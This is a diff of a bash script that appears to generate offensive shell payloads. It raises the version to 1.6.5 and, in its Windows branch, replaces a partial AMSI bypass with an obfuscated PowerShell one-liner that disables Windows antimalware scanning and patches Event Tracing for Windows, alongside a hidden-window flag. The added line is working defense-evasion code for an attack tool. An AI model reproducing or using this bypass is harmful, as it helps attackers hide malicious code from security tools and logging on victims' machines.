@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 DIR="$1"
-version="1.6.4"
+version="1.6.5"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -696,8 +696,8 @@ then
     windows=1
     win="-W!${space}!Hidden"
     at="@"
-    #"Mini-AMSI-bypass. Partial"
-    AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
+    #"Mini-AMSI-bypass and ETW-patch"
+    AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);(([Reflection.Assembly]::LoadWithPartialName('System.Core').GetTypes()|?{\$_-clike'*i*'}).GetFields(4*13)|?{\$_-clike'*m_e*d'}).SetValue((([Ref].Assembly.GetTypes()|?{\$_-clike'*E*r'}).GetFields(104)|?{\$_-clike'*t*w*r'}).GetValue($null),0) "
 else 
     windows=0 
   
